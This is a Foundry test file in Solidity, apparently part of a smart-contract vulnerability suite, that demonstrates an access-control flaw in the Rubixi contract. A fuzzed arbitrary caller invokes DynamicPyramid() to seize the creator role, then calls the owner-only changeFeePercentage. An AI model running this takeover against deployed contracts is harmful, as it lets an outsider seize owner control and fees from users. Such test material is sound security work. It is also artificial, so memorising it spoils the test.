
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Rubixi} from "../src/Rubixi.sol";

contract TestAccessControlRubixi is Test {
    Rubixi public _contractUnderTest;

    function setUp() public {
        _contractUnderTest = new Rubixi();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // --- 1. Constraints ---
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm));
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);

        // Exclude the original creator (the deployer of the contract)
        vm.assume(caller != address(this));

        // --- 2. State Configuration ---
        // No special state or funding required: DynamicPyramid is non-payable and has no preconditions.

        // --- 3. Execution & Assertion ---
        vm.prank(caller);

        // Trigger vulnerability: any arbitrary caller can reset the creator
        _contractUnderTest.DynamicPyramid();

        // Optional assertion: the creator should now be the arbitrary caller
        // This proves that a non-privileged user can take over the critical role.
        // We cannot read `creator` directly (it's private), but we can infer control
        // by having `caller` successfully execute an onlyowner function afterward.

        vm.prank(caller);
        _contractUnderTest.changeFeePercentage(5);
    }
}
